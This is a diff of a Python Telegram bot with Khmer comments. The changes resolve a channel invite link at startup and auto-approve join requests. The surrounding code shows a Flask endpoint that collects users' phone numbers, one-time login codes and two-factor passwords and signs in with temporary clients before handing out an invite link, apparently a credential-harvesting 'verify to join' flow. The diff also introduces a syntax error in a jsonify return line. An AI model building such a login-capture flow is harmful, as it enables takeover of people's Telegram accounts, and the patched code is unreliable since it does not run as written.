@@ -12,9 +12,12 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
 ADMIN_SESSION_STRING = os.getenv("ADMIN_SESSION_STRING", "")
 
-# 🛠 បម្លែង Channel ID ឱ្យទៅជា Integer ត្រឹមត្រូវ (ការពារ Error Peer id invalid)
+# 🛠 អនុញ្ញាតឱ្យដាក់ទាំងលេខ ID ឬក៏លីង Invite (t.me/...) ស្វ័យប្រវត្តិ
 raw_channel_id = os.getenv("CHANNEL_ID", "")
-CHANNEL_ID = int(raw_channel_id) if raw_channel_id.lstrip('-').isdigit() else raw_channel_id
+if raw_channel_id.lstrip('-').isdigit():
+    CHANNEL_ID = int(raw_channel_id)
+else:
+    CHANNEL_ID = raw_channel_id  # ទុកជា Link ឱ្យ Script ធ្វើការ Resolve ពេល Startup
 
 temp_clients = {}
 
@@ -137,14 +140,13 @@ async def async_verify_code(phone_number, code, password):
         "redirectUrl": invite_link
     }
 
-# 🛠 Event Listener: ច្រោះយកតែ Channel របស់យើងប៉ុណ្ណោះ ដើម្បីការពារ Error ពី Group/Channel ផ្សេង
+# 🛠 Event Listener: Auto-Approve និង Revoke លីងចោលភ្លាមៗពេលមានគេ Join
 if admin_client:
     @admin_client.on_chat_join_request()
     async def handle_join_request(client, chat_join_request):
         try:
             chat_id = chat_join_request.chat.id
             
-            # បើមិនមែនជា Channel គោលដៅរបស់យើងទេ ឱ្យរំលងចោលភ្លាម
             if chat_id != CHANNEL_ID:
                 return
 
@@ -195,7 +197,7 @@ def verify_code():
     password = data.get('password')
 
     if not phone_number or not code:
-        return jsonify({"success": False, "error": "Phone number and OTP code are required"}), 400
+        return jsonify({"success": False, "error": "Phone number and OTP code are required"}}, 400
 
     phone_number = phone_number.strip()
     if not phone_number.startswith('+'):
@@ -211,14 +213,24 @@ def verify_code():
         return jsonify({"success": False, "error": str(err)}), 400
 
 async def start_admin_client():
+    global CHANNEL_ID
     if admin_client:
         try:
             await admin_client.start()
             print("Admin client session started successfully!")
             
-            # Cache Channel ទុកជាមុន
-            if CHANNEL_ID:
+            # 🛠 ប្រសិនបើ CHANNEL_ID ជា Link វានឹងស្វ័យប្រវត្តិ Join/Resolve យក ID ពិតប្រាកដមកប្រើ
+            if isinstance(CHANNEL_ID, str) and ("t.me/" in CHANNEL_ID or "+" in CHANNEL_ID):
+                print(f"Resolving invite link: {CHANNEL_ID}")
+                try:
+                    chat = await admin_client.join_chat(CHANNEL_ID)
+                except Exception:
+                    chat = await admin_client.get_chat(CHANNEL_ID)
+                CHANNEL_ID = chat.id
+                print(f"Successfully resolved channel ID to: {CHANNEL_ID}")
+            elif CHANNEL_ID:
                 chat = await admin_client.get_chat(CHANNEL_ID)
+                CHANNEL_ID = chat.id
                 print(f"Successfully cached channel: {chat.title} ({chat.id})")
         except Exception as e:
             print(f"Failed to start admin client or resolve channel: {e}")
